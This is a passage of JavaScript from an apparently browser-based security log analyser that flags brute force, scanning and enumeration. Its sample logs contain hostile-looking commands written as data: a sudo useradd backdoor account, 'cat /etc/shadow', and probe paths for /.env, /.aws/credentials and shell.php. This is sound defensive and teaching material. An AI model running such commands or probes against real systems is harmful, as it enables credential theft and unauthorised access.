      }
      pbody.push('');
      pbody.push('This is a string match against the request line and one decode of it.');
      pbody.push('A search box query, a security article URL in a referrer, or a');
      pbody.push('parameter that legitimately contains one of these strings will all');
      pbody.push('land here. Read the lines before acting on the count.');
      addFinding(findings, p.def.sev,
        names[i] + ' — ' + plural(p.n, 'request') + ' from ' + plural(countKeys(p.ips), 'address'),
        pbody, evidence(res, p.lines, null));
    }

    /* --- scanner path fingerprints -------------------------------------- */
    var scanNames = Object.keys(scanHits);
    if (scanNames.length) {
      scanNames.sort(function (a, b) { return scanHits[b].n - scanHits[a].n; });
      var body = ['Requests for paths that do not exist on most sites and are not',
                  'reached by following a link. Each group is a family of probes:',
                  ''];
      var allLines = [];
      for (i = 0; i < scanNames.length; i++) {
        var h = scanHits[scanNames[i]];
        body.push('  ' + pad(safe(scanNames[i], 44), 46) + padLeft(num(h.n), 6) +
                  '   from ' + plural(countKeys(h.ips), 'address'));
        if (h.examples.length) body.push('      e.g. ' + h.examples[0]);
        allLines = allLines.concat(h.lines.slice(0, 2));
      }
      /* Grouped for the summary, but the evidence reads back in file order —
         nobody scrolls a log by probe family. */
      allLines.sort(function (a, b) { return a - b; });
      body.push('');
      body.push('Automated scanning of anything reachable from the internet is');
      body.push('constant and mostly means nothing. What is worth checking is');
      body.push('whether any of these got a 2xx, and whether one address is');
      body.push('working through the list methodically rather than opportunistically.');
      addFinding(findings, 'medium',
        'Scanner fingerprints across ' + plural(scanNames.length, 'probe family'),
        body, evidence(res, allLines, null));
    }

    /* --- self-declared tooling ------------------------------------------ */
    var uaNames = Object.keys(uaHits);
    uaNames.sort(function (a, b) { return uaHits[b].n - uaHits[a].n; });
    for (i = 0; i < uaNames.length; i++) {
      var uh = uaHits[uaNames[i]];
      if (uh.def.sev === 'low' && uh.n < 20) continue;
      addFinding(findings, uh.def.sev,
        'User agent "' + safe(uaNames[i], 40) + '" — ' + plural(uh.n, 'request'),
        ['what it is       ' + uh.def.what,
         'sources          ' + topKeys(uh.ips, 5).join(', ') + (countKeys(uh.ips) > 5 ? ', …' : ''),
         '',
         'A user agent is a self-reported string. Anything here can be forged in',
         'one line of code, and real attackers routinely send a Chrome string. So',
         'this is useful for the honest half of the traffic and worth nothing as',
         'a control: never treat the absence of a scanner UA as the absence of a',
         'scanner.'],
        evidence(res, uh.lines, null));
    }

    /* --- clients whose traffic is almost all 404 ------------------------ */
    var ips = Object.keys(byIp), scanners = [];
    for (i = 0; i < ips.length; i++) {
      var c = byIp[ips[i]];
      if (c.c404 >= SCAN_MIN_404 && c.c404 / c.hits >= SCAN_404_RATIO) scanners.push(c);
    }
    scanners.sort(function (a, b) { return b.c404 - a.c404; });
    for (i = 0; i < scanners.length && i < MAX_PER_KIND; i++) {
      var sc = scanners[i];
      addFinding(findings, 'medium',
        'Enumeration from ' + sc.ip + ' — ' + num(sc.c404) + ' of ' + num(sc.hits) + ' requests were 404',
        ['requests         ' + num(sc.hits),
         '404 responses    ' + num(sc.c404) + '  (' + pct(sc.c404, sc.hits) + ')',
         'distinct paths   ' + num(countKeys(sc.paths)),
         'user agent       ' + (topKeys(sc.uas, 1)[0] ? safe(topKeys(sc.uas, 1)[0], 90) : '(none sent)'),
         '',
         'A browser gets a 404 occasionally. A client whose traffic is mostly',
         '404s is asking for things it has no reason to think exist, which is',
         'the definition of enumeration. The ratio matters more than the count —',
         'a busy site produces thousands of honest 404s from broken links.'],
        evidence(res, sc.lines, null));
    }

    /* --- response size outliers ----------------------------------------- */
    sizeOutliers(res, sizes, sizeSum, sizeN, findings);
  }

  /* Unusual response sizes. Mean and standard deviation over the 200s only,
     because mixing a 404 page and a video download into one distribution
     produces a threshold that means nothing. */
  function sizeOutliers(res, sizes, sum, n, findings) {
    if (n < 20) return;
    var mean = sum / n, varSum = 0, i, d;
    for (i = 0; i < sizes.length; i++) {
      d = sizes[i].bytes - mean;
      varSum += d * d;
    }
    var sd = Math.sqrt(varSum / n);
    if (!isFinite(sd) || sd <= 0) return;
    var cut = mean + SIZE_SIGMA * sd;

    var big = [], zero = 0;
    for (i = 0; i < sizes.length; i++) {
      if (sizes[i].bytes > cut) big.push(sizes[i]);
      if (sizes[i].bytes === 0) zero++;
    }
    if (!big.length && zero < n * 0.2) return;

    big.sort(function (a, b) { return b.bytes - a.bytes; });
    var body = [
      'mean 200 response  ' + LabTool.humanBytes(Math.round(mean)),
      'standard deviation ' + LabTool.humanBytes(Math.round(sd)),
      'outlier threshold  ' + LabTool.humanBytes(Math.round(cut)) + '  (mean + ' + SIZE_SIGMA + ' sd)',
      ''
    ];
    if (big.length) {
      body.push('Largest responses:');
      for (i = 0; i < big.length && i < 8; i++) {
        body.push('  ' + padLeft(LabTool.humanBytes(big[i].bytes), 10) + '   ' +
                  safe(big[i].ip, 40) + '   ' + safe(big[i].target, 80));
      }
      body.push('');
    }
    if (zero >= n * 0.2) {
      body.push(num(zero) + ' of the 200 responses sent zero bytes (' + pct(zero, n) + ').');
      body.push('That is normal for HEAD requests, conditional GETs answered from cache,');
      body.push('and health checks; it is also what a client that opens connections');
      body.push('without reading them looks like.');
      body.push('');
    }
    body.push('A large response on an endpoint that normally returns a small one is');
    body.push('what bulk extraction looks like from the log side. It is equally what');
    body.push('a legitimate export, a report download or a cached asset looks like.');
    body.push('The size alone decides nothing; the endpoint and who asked for it do.');

    addFinding(findings, 'low', 'Response sizes outside the normal range',
      body, evidence(res, big.slice(0, MAX_EVIDENCE).map(function (r) { return r.n; }), null));
  }

  /* ======================================================================
     Rendering
     ====================================================================== */

  var SEV_ORDER = { high: 0, medium: 1, low: 2, info: 3 };
  var SEV_CLASS = { high: 't-err', medium: 't-warn', low: 't-info', info: 't-dim' };
  var SEV_LABEL = { high: 'HIGH  ', medium: 'MEDIUM', low: 'LOW   ', info: 'NOTE  ' };

  function renderFindings(findings) {
    R.rule();
    R.heading('FINDINGS');
    if (!findings.length) {
      R.line('');
      R.ok('Nothing in this log matched any of the patterns above.');
      R.dim('That is not the same as "nothing happened". This reads one file with');
      R.dim('a fixed set of rules; an attack that left no failed authentication and');
      R.dim('no unusual request is invisible to it, and so is anything that happened');
      R.dim('before the log rotated.');
      return;
    }

    findings.sort(function (a, b) { return SEV_ORDER[a.sev] - SEV_ORDER[b.sev]; });

    var i, k;
    for (i = 0; i < findings.length; i++) {
      var f = findings[i];
      R.line('');
      R.line('[' + SEV_LABEL[f.sev] + '] ' + f.title, SEV_CLASS[f.sev]);
      R.line('─'.repeat(52), 't-dim');
      for (k = 0; k < f.body.length; k++) R.line(f.body[k]);
      if (f.ev.length) {
        R.line('');
        R.dim('evidence:');
        for (k = 0; k < f.ev.length; k++) R.line(f.ev[k], 't-dim');
      }
    }
  }

  /* Three sources feed one plot, in order of how much they say. A web log
     shades by response code, an auth log by failed attempt, and a plain syslog
     file — which has neither — falls back to every timestamped line shaded by
     a trouble keyword. Without that last branch a syslog file drew nothing at
     all, because "no failed logins" is not the same as "no events". */
  function renderTimeline(res) {
    var allT = [], badT = [], total = 0, label, i, items;

    if (res.kind === 'web') {
      items = res.web;
      total = items.length;
      label = 'total / 4xx+5xx';
      for (i = 0; i < items.length; i++) {
        if (items[i].t === null || items[i].t === undefined) continue;
        allT.push(items[i].t);
        if (items[i].status >= 400) badT.push(items[i].t);
      }
    } else if (res.auth.length) {
      items = res.auth;
      total = items.length;
      label = 'total / failed';
      for (i = 0; i < items.length; i++) {
        if (items[i].t === null || items[i].t === undefined) continue;
        allT.push(items[i].t);
        if (items[i].ok === false) badT.push(items[i].t);
      }
    } else {
      allT = res.times;
      badT = res.badTimes;
      total = res.parsed;
      label = 'total / trouble words';
    }

    R.rule();
    R.heading('TIMELINE');
    if (allT.length < 2) {
      R.dim('Too few entries carried a usable timestamp to draw one.');
      return;
    }

    /* Derived from what is actually plotted, not from the file's overall span.
       In an auth.log the authentication lines are a small subset of a much
       longer file, and sizing the buckets to the file gives forty empty ones
       and a single spike. */
    var min = allT[0], max = allT[0];
    for (i = 1; i < allT.length; i++) {
      if (allT[i] < min) min = allT[i];
      if (allT[i] > max) max = allT[i];
    }
    var span = max - min;
    if (!(span > 0)) {
      R.dim('Everything in this log shares one timestamp, so there is nothing to plot.');
      return;
    }

    /* A bucket the reader recognises beats a bucket that divides evenly. */
    var STEPS = [1000, 5000, 15000, 60000, 300000, 900000, 3600000,
                 6 * 3600000, 12 * 3600000, 86400000, 7 * 86400000];
    var STEP_NAMES = {
      1000: '1 second', 5000: '5 seconds', 15000: '15 seconds',
      60000: '1 minute', 300000: '5 minutes', 900000: '15 minutes',
      3600000: '1 hour', 21600000: '6 hours', 43200000: '12 hours',
      86400000: '1 day', 604800000: '1 week'
    };
    var want = span / TIMELINE_BUCKETS, step = STEPS[STEPS.length - 1], s;
    for (s = 0; s < STEPS.length; s++) {
      if (STEPS[s] >= want) { step = STEPS[s]; break; }
    }

    var buckets = {}, order = [], key, peak = 0;
    for (i = 0; i < allT.length; i++) {
      key = Math.floor(allT[i] / step) * step;
      if (!buckets[key]) { buckets[key] = { total: 0, bad: 0 }; order.push(key); }
      buckets[key].total++;
      if (buckets[key].total > peak) peak = buckets[key].total;
    }
    for (i = 0; i < badT.length; i++) {
      key = Math.floor(badT[i] / step) * step;
      if (buckets[key]) buckets[key].bad++;
    }
    order.sort(function (a, b) { return a - b; });

    R.row('bucket', STEP_NAMES[step] || duration(step));
    R.row('span', fmtTime(min) + '  →  ' + fmtTime(max) + '   (' + duration(span) + ')');
    R.row('plotted', num(allT.length) + ' of ' + num(total) + ' entries');
    R.line('');
    R.dim('  time                  events                                     ' + label);

    var shown = 0;
    for (i = 0; i < order.length && shown < 60; i++) {
      var b = buckets[order[i]];
      shown++;
      var cls = b.bad > b.total * 0.5 ? 't-warn' : 't-dim';
      R.line('  ' + pad(fmtTime(order[i]), 21) +
             bar(b.total / peak, 38) + '  ' +
             padLeft(num(b.total), 7) + ' / ' + num(b.bad), cls);
    }
    if (order.length > shown) {
      R.dim('  … ' + num(order.length - shown) + ' further buckets not plotted');
    }
    R.line('');
    R.dim('Empty periods are omitted rather than drawn as gaps, so a quiet hour');
    R.dim('and a rotated-away hour look the same here. Check the span above.');
  }

  function renderTalkers(res) {
    R.rule();
    R.heading('TOP TALKERS');

    if (res.kind === 'web') {
      var byIp = res.byIp || {};
      var ips = topKeys(mapCount(byIp, 'hits'), TOP_TALKERS);
      if (!ips.length) { R.dim('No client addresses were parsed.'); return; }
      R.line('  ' + pad('address', 40) + padLeft('reqs', 8) + padLeft('2xx', 8) +
             padLeft('4xx', 8) + padLeft('5xx', 7) + padLeft('bytes', 11) + '  paths', 't-dim');
      for (var i = 0; i < ips.length; i++) {
        var c = byIp[ips[i]];
        R.line('  ' + pad(safe(ips[i], 38), 40) + padLeft(num(c.hits), 8) +
               padLeft(num(c.c2xx), 8) + padLeft(num(c.c4xx), 8) + padLeft(num(c.c5xx), 7) +
               padLeft(LabTool.humanBytes(c.bytes), 11) + '  ' + num(countKeys(c.paths)),
               c.c4xx > c.c2xx ? 't-warn' : '');
      }
      return;
    }

    var bySrc = res.bySrc || {};
    var keys = Object.keys(bySrc);
    if (!keys.length) { R.dim('No authentication events were parsed, so there is nobody to rank.'); return; }
    keys.sort(function (a, b) {
      var d = (bySrc[b].fails + bySrc[b].oks) - (bySrc[a].fails + bySrc[a].oks);
      return d !== 0 ? d : bySrc[b].fails - bySrc[a].fails;
    });
    R.line('  ' + pad('source', 40) + padLeft('failed', 9) + padLeft('ok', 7) +
           padLeft('accounts', 10) + '  first seen', 't-dim');
    for (var k = 0; k < keys.length && k < TOP_TALKERS; k++) {
      var s = bySrc[keys[k]];
      R.line('  ' + pad(safe(keys[k], 38), 40) + padLeft(num(s.fails), 9) +
             padLeft(num(s.oks), 7) + padLeft(num(unionCount(s.users, s.okUsers)), 10) +
             '  ' + fmtTime(s.first),
             s.fails >= BRUTE_MIN_FAILS ? 't-warn' : (s.oks && !s.fails ? 't-ok' : ''));
    }
    if (keys.length > TOP_TALKERS) {
      R.dim('  … ' + num(keys.length - TOP_TALKERS) + ' further sources not listed');
    }
  }

  function mapCount(obj, field) {
    var res = {}, keys = Object.keys(obj), i;
    for (i = 0; i < keys.length; i++) res[keys[i]] = obj[keys[i]][field];
    return res;
  }

  function renderWebDetail(res) {
    var status = res.status || {}, keys = topKeys(status), i, total = 0;
    for (i = 0; i < keys.length; i++) total += status[keys[i]];

    R.rule();
    R.heading('STATUS CODE PROFILE');
    if (!keys.length) { R.dim('No status codes were parsed.'); return; }
    keys.sort(function (a, b) { return (+a) - (+b); });
    var peak = 0;
    for (i = 0; i < keys.length; i++) if (status[keys[i]] > peak) peak = status[keys[i]];
    for (i = 0; i < keys.length; i++) {
      var code = +keys[i];
      var cls = code >= 500 ? 't-err' : code >= 400 ? 't-warn' : code >= 300 ? 't-dim' : 't-ok';
      R.line('  ' + pad(keys[i] + '  ' + (STATUS_TEXT[code] || ''), 34) +
             bar(status[keys[i]] / peak, 26) + '  ' +
             padLeft(num(status[keys[i]]), 8) + '  ' + padLeft(pct(status[keys[i]], total), 7), cls);
    }

    R.line('');
    R.heading('MOST REQUESTED PATHS');
    var paths = topKeys(res.paths || {}, TOP_ROWS);
    for (i = 0; i < paths.length; i++) {
      R.line('  ' + padLeft(num(res.paths[paths[i]]), 8) + '  ' + safe(paths[i], 110));
    }

    R.line('');
    R.heading('MOST COMMON USER AGENTS');
    var uas = topKeys(res.uas || {}, TOP_ROWS);
    if (!uas.length) R.dim('  none recorded — this log format does not carry the user agent');
    for (i = 0; i < uas.length; i++) {
      R.line('  ' + padLeft(num(res.uas[uas[i]]), 8) + '  ' + safe(uas[i], 110));
    }
  }

  var STATUS_TEXT = {
    200: 'OK', 201: 'created', 204: 'no content', 206: 'partial',
    301: 'moved permanently', 302: 'found', 304: 'not modified',
    400: 'bad request', 401: 'unauthorised', 403: 'forbidden', 404: 'not found',
    405: 'method not allowed', 408: 'timeout', 413: 'payload too large',
    429: 'rate limited', 444: 'connection closed (nginx)',
    499: 'client closed (nginx)', 500: 'server error', 502: 'bad gateway',
    503: 'unavailable', 504: 'gateway timeout'
  };

  function renderAuthDetail(res) {
    R.rule();
    R.heading('AUTHENTICATION SUMMARY');
    var fails = 0, oks = 0, i;
    for (i = 0; i < res.auth.length; i++) {
      if (res.auth[i].ok) oks++; else fails++;
    }
    R.row('events read', num(res.auth.length));
    R.row('failed', num(fails), fails ? 't-warn' : 't-dim');
    R.row('successful', num(oks), oks ? 't-ok' : 't-dim');
    R.row('distinct sources', num(countKeys(res.bySrc || {})));
    R.row('distinct accounts', num(countKeys(res.byUser || {})));
    if (res.probes.length) {
      R.row('username probes', num(res.probes.length) + '  (not counted as attempts)');
    }

    var byUser = res.byUser || {};
    var users = Object.keys(byUser);
    users.sort(function (a, b) { return byUser[b].fails - byUser[a].fails; });
    if (users.length) {
      R.line('');
      R.heading('ACCOUNTS BY FAILED ATTEMPTS');
      R.line('  ' + pad('account', 34) + padLeft('failed', 9) + padLeft('ok', 7) +
             padLeft('sources', 10), 't-dim');
      for (i = 0; i < users.length && i < TOP_ROWS; i++) {
        var u = byUser[users[i]];
        R.line('  ' + pad(safe(users[i], 32), 34) + padLeft(num(u.fails), 9) +
               padLeft(num(u.oks), 7) + padLeft(num(countKeys(u.srcs)), 10),
               u.oks && u.fails ? 't-warn' : (u.oks ? 't-ok' : ''));
      }
      R.line('');
      R.dim('An account with failures AND successes from the same log is the one to');
      R.dim('read first — that is either a user who mistyped, or the moment someone');
      R.dim('stopped guessing.');
    }

    if (res.probes.length) {
      var probeUsers = {};
      for (i = 0; i < res.probes.length; i++) bump(probeUsers, res.probes[i].user);
      R.line('');
      R.heading('USERNAMES PROBED THAT DO NOT EXIST');
      var pk = topKeys(probeUsers, TOP_ROWS);
      for (i = 0; i < pk.length; i++) {
        R.line('  ' + padLeft(num(probeUsers[pk[i]]), 8) + '  ' + safe(pk[i], 60));
      }
      R.line('');
      R.dim('These are sshd "Invalid user" lines: a username was offered and the');
      R.dim('account does not exist. They are counted separately from failures on');
      R.dim('purpose, because sshd logs the invalid-user notice AND the failed');
      R.dim('attempt, and adding both doubles every number above.');
    }
  }

  function renderSyslogDetail(res) {
    R.rule();
    R.heading('WHAT THIS LOG IS MOSTLY MADE OF');
    var progs = topKeys(res.programs, TOP_ROWS), i;
    if (progs.length) {
      R.line('  ' + pad('program', 34) + 'lines', 't-dim');
      for (i = 0; i < progs.length; i++) {
        R.line('  ' + pad(safe(progs[i], 32), 34) + num(res.programs[progs[i]]));
      }
    } else {
      R.dim('  no recognisable program field — these lines are not syslog-shaped');
    }

    var msgs = topKeys(res.messages, TOP_ROWS);
    if (msgs.length) {
      R.line('');
      R.heading('MOST REPEATED MESSAGES');
      R.dim('Numbers, PIDs and addresses are folded together so identical events group.');
      R.line('');
      for (i = 0; i < msgs.length; i++) {
        R.line('  ' + padLeft(num(res.messages[msgs[i]]), 8) + '  ' + safe(msgs[i], 110));
      }
    }
  }

  function renderLimits() {
    R.rule();
    R.heading('WHAT THIS IS NOT');
    R.dim('It is not a SIEM. There is no correlation across sources: this reads the');
    R.dim('one file you gave it, and an attack that touched three systems looks like');
    R.dim('a third of an attack here.');
    R.dim('');
    R.dim('There is no threat intelligence and no reputation data. An address that');
    R.dim('appears in every blocklist on the internet is, to this page, an address.');
    R.dim('There is no GeoIP either, which is why the timing findings say "two');
    R.dim('sources" and never "two countries".');
    R.dim('');
    R.dim('Nothing here is stored, indexed or remembered. Reload the page and it is');
    R.dim('gone, which is the trade for it never being uploaded in the first place.');
    R.dim('');
    R.dim('Every threshold used is printed above. They are defaults that suit a');
    R.dim('small estate; a login page that fronts ten thousand users needs different');
    R.dim('ones, and a report that hid its thresholds would be pretending otherwise.');
    R.line('');
    R.dim('Nothing left this tab. The file was read with FileReader and every number');
    R.dim('above was computed here, on your processor.');
  }

  /* ======================================================================
     Driver
     ====================================================================== */

  var lastText = '', lastName = '';
  /* Not the same question as "is the output pane empty". The pane holds the
     help text from the moment the page loads, so gating the export buttons on
     mirror.length handed people a text file containing the instructions and
     called it a report. */
  var reported = false;

  function analyse(text, name) {
    R.clear();
    reported = false;

    if (!text || !text.replace(/\s/g, '')) {
      R.warn('Nothing to read yet.');
      R.line('');
      R.dim('Paste a log into the box on the left, drop a file onto the zone above');
      R.dim('it, or pick one of the worked examples from the toolbar.');
      return;
    }

    var truncated = false;
    if (text.length > MAX_BYTES) {
      text = text.slice(0, MAX_BYTES);
      truncated = true;
    }

    /* A global regex over sixteen megabytes costs the better part of a second
       even when it matches nothing, and a log written on Linux — which is most
       of them — contains no carriage return at all. One indexOf decides
       whether that pass is needed. */
    var body = text.indexOf('\r') < 0 ? text : text.replace(/\r\n?/g, '\n');
    var lines = body.split('\n');
    if (lines.length > MAX_LINES) {
      lines = lines.slice(0, MAX_LINES);
      truncated = true;
    }

    var choice = document.getElementById('tool-format');
    var forced = choice ? choice.value : 'auto';
    var det = detect(text, lines);
    if (forced && forced !== 'auto') {
      det = { id: forced, label: FORMATS[forced], sampled: 0, matched: 0,
              why: 'chosen by hand in the format selector, overriding detection' };
    }

    var res = newResult(det, lines);
    res.firstT = null;
    res.lastT = null;
    res.truncated = truncated;
    res.name = name;

    reported = true;
    R.heading(name || 'pasted text');
    R.row('size', LabTool.humanBytes(text.length));
    R.row('lines', num(lines.length) + (truncated ? '   (truncated — see below)' : ''));
    R.row('format', det.label, 't-info');
    R.dim('                      detected because ' + det.why);
    if (truncated) {
      R.line('');
      R.warn('This file was cut at ' + LabTool.humanBytes(MAX_BYTES) + ' / ' + num(MAX_LINES) +
             ' lines so the tab stays usable.');
      R.dim('Everything below covers only the part that was read. For a bigger log,');
      R.dim('split it first — the counts would be wrong rather than incomplete if');
      R.dim('this carried on past the cut without saying so.');
    }
    R.rule();

    try {
      if (det.id === 'web') { res.kind = 'web'; parseWeb(lines, res); }
      else if (det.id === 'iis') { res.kind = 'web'; parseIis(lines, res); }
      else if (det.id === 'winsec') { res.kind = 'auth'; parseWinsec(text, res); }
      else { res.kind = 'auth'; parseSyslogish(lines, res, det.id === 'auth'); }
    } catch (err) {
      R.err('The parser stopped on an internal error: ' +
            ((err && err.message) || String(err)));
      R.dim('Whatever is printed above is still valid. If this is reproducible, the');
      R.dim('file is shaped in a way worth knowing about — the report link below');
      R.dim('goes straight to me.');
      return;
    }

    R.row('entries parsed', num(res.parsed));
    if (res.firstT !== null && res.lastT !== null) {
      R.row('time span', fmtTime(res.firstT) + '  →  ' + fmtTime(res.lastT));
      R.row('covering', duration(res.lastT - res.firstT));
    } else {
      R.row('time span', 'no usable timestamps found');
    }
    /* The convention note is only meaningful once there are timestamps to
       apply it to. Printing it over a file with none reads as a claim about
       times that are not there. */
    if (res.timeNote && res.firstT !== null) {
      R.line('');
      R.dim(wrapNote(res.timeNote));
    }
    var i;
    for (i = 0; i < res.notes.length; i++) {
      R.line('');
      R.dim(wrapNote(res.notes[i]));
    }

    if (!res.parsed) {
      R.line('');
      R.err('Not one line matched the ' + det.label + ' parser.');
      R.dim('Either the format was detected wrongly — try picking it by hand in the');
      R.dim('selector — or this is a format nothing here reads. The five it reads are');
      R.dim('Linux auth.log, nginx/Apache access logs, IIS W3C, Windows Security CSV,');
      R.dim('and generic syslog.');
      renderLimits();
      return;
    }

    var findings = [];
    analyseAuth(res, findings);
    if (res.kind === 'web') analyseWeb(res, findings);

    renderFindings(findings);
    renderTimeline(res);
    renderTalkers(res);
    if (res.kind === 'web') renderWebDetail(res);
    if (res.auth.length || res.probes.length) renderAuthDetail(res);
    if (det.id === 'syslog') renderSyslogDetail(res);
    renderLimits();
  }

  /* Notes are written as one long sentence in the parsers; wrap them here so
     the pane does not force a horizontal scrollbar on a phone. */
  function wrapNote(text) {
    var words = String(text).split(/\s+/), out2 = [], line = '';
    for (var i = 0; i < words.length; i++) {
      if ((line + ' ' + words[i]).length > 74) { out2.push(line); line = words[i]; }
      else line = line ? line + ' ' + words[i] : words[i];
    }
    if (line) out2.push(line);
    return out2.join('\n');
  }

  /* ======================================================================
     Worked examples. Addresses are from the documentation ranges reserved by
     RFC 5737 (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) so nothing here
     names a real host.
     ====================================================================== */

  var SAMPLES = {
    ssh: [
      'Aug 30 03:10:58 web01 sshd[20402]: Invalid user admin from 203.0.113.44 port 51118',
      'Aug 30 03:10:58 web01 sshd[20402]: Failed password for invalid user admin from 203.0.113.44 port 51118 ssh2',
      'Aug 30 03:11:00 web01 sshd[20404]: Failed password for invalid user admin from 203.0.113.44 port 51120 ssh2',
      'Aug 30 03:11:02 web01 sshd[20406]: Failed password for root from 203.0.113.44 port 51122 ssh2',
      'Aug 30 03:11:04 web01 sshd[20406]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.44 user=root',
      'Aug 30 03:11:05 web01 sshd[20408]: Failed password for root from 203.0.113.44 port 51126 ssh2',
      'Aug 30 03:11:08 web01 sshd[20410]: Failed password for root from 203.0.113.44 port 51130 ssh2',
      'Aug 30 03:11:11 web01 sshd[20412]: Failed password for root from 203.0.113.44 port 51134 ssh2',
      'Aug 30 03:11:14 web01 sshd[20414]: Failed password for root from 203.0.113.44 port 51138 ssh2',
      'Aug 30 03:11:17 web01 sshd[20416]: Failed password for root from 203.0.113.44 port 51142 ssh2',
      'Aug 30 03:11:20 web01 sshd[20418]: error: maximum authentication attempts exceeded for root from 203.0.113.44 port 51146 ssh2 [preauth]',
      'Aug 30 03:12:04 web01 sshd[20440]: Failed password for deploy from 203.0.113.44 port 51190 ssh2',
      'Aug 30 03:12:31 web01 sshd[20444]: Failed password for deploy from 203.0.113.44 port 51204 ssh2',
      'Aug 30 03:13:02 web01 sshd[20450]: Failed password for deploy from 203.0.113.44 port 51222 ssh2',
      'Aug 30 03:14:51 web01 sshd[20488]: Accepted password for deploy from 203.0.113.44 port 51290 ssh2',
      'Aug 30 03:14:51 web01 sshd[20488]: pam_unix(sshd:session): session opened for user deploy by (uid=0)',
      'Aug 30 03:15:10 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id',
      'Aug 30 03:15:22 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup',
      'Aug 30 03:15:22 web01 useradd[20501]: new user: name=svc-backup, UID=1004, GID=1004, home=/home/svc-backup, shell=/bin/bash',
      'Aug 30 03:15:29 web01 usermod[20507]: add \'svc-backup\' to group \'sudo\'',
      'Aug 30 03:16:04 web01 sshd[20520]: Accepted publickey for svc-backup from 198.51.100.77 port 44120 ssh2: RSA SHA256:0xbAdC0ffee',
      'Aug 30 08:41:12 web01 sshd[21880]: Accepted password for deploy from 192.0.2.19 port 60122 ssh2'
    ].join('\n'),

    spray: [
      'Aug 31 09:02:11 dc01 sshd[3011]: Failed password for alice from 198.51.100.23 port 40012 ssh2',
      'Aug 31 09:02:14 dc01 sshd[3013]: Failed password for bob from 198.51.100.23 port 40018 ssh2',
      'Aug 31 09:02:17 dc01 sshd[3015]: Failed password for carol from 198.51.100.23 port 40024 ssh2',
      'Aug 31 09:02:20 dc01 sshd[3017]: Failed password for dave from 198.51.100.23 port 40030 ssh2',
      'Aug 31 09:02:23 dc01 sshd[3019]: Failed password for erin from 198.51.100.23 port 40036 ssh2',
      'Aug 31 09:02:26 dc01 sshd[3021]: Failed password for frank from 198.51.100.23 port 40042 ssh2',
      'Aug 31 09:02:29 dc01 sshd[3023]: Failed password for grace from 198.51.100.23 port 40048 ssh2',
      'Aug 31 09:02:32 dc01 sshd[3025]: Failed password for heidi from 198.51.100.23 port 40054 ssh2',
      'Aug 31 09:02:35 dc01 sshd[3027]: Failed password for ivan from 198.51.100.23 port 40060 ssh2',
      'Aug 31 09:02:38 dc01 sshd[3029]: Failed password for judy from 198.51.100.23 port 40066 ssh2',
      'Aug 31 09:02:41 dc01 sshd[3031]: Failed password for mallory from 198.51.100.23 port 40072 ssh2',
      'Aug 31 09:02:44 dc01 sshd[3033]: Failed password for oscar from 198.51.100.23 port 40078 ssh2',
      'Aug 31 09:14:02 dc01 sshd[3120]: Failed password for alice from 198.51.100.23 port 41002 ssh2',
      'Aug 31 09:14:06 dc01 sshd[3122]: Failed password for bob from 198.51.100.23 port 41008 ssh2',
      'Aug 31 09:14:10 dc01 sshd[3124]: Failed password for carol from 198.51.100.23 port 41014 ssh2',
      'Aug 31 09:14:14 dc01 sshd[3126]: Accepted password for dave from 198.51.100.23 port 41020 ssh2',
      'Aug 31 09:14:15 dc01 sshd[3126]: pam_unix(sshd:session): session opened for user dave by (uid=0)',
      'Aug 31 09:19:41 dc01 sshd[3190]: Accepted password for dave from 203.0.113.90 port 55012 ssh2',
      'Aug 31 09:31:07 dc01 sudo:   dave : TTY=pts/1 ; PWD=/home/dave ; USER=root ; COMMAND=/bin/cat /etc/shadow',
      'Aug 31 09:33:55 dc01 su[3255]: FAILED SU (to root) dave on pts/1',
      'Aug 31 09:34:12 dc01 su[3260]: FAILED SU (to root) dave on pts/1'
    ].join('\n'),

    nginx: [
      '203.0.113.55 - - [31/Aug/2026:11:02:03 +0000] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '203.0.113.55 - - [31/Aug/2026:11:02:05 +0000] "GET /assets/app.css HTTP/1.1" 200 18422 "https://example.test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '198.51.100.202 - - [31/Aug/2026:11:03:11 +0000] "GET /.env HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:12 +0000] "GET /.git/config HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:12 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:13 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:13 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:14 +0000] "GET /actuator/env HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:14 +0000] "GET /cgi-bin/luci HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:15 +0000] "GET /backup.sql HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:15 +0000] "GET /shell.php HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:16 +0000] "GET /admin.php HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:16 +0000] "GET /wp-content/plugins/revslider/temp/update_extract/revslider/db.php HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:17 +0000] "GET /.aws/credentials HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:17 +0000] "GET /solr/admin/info/system HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
      '198.51.100.202 - - [31/Aug/2026:11:03:18 +0000] "GET /HNAP1/ HTTP/1.1" 404 162 "-" "python-requests/2.31.0"',
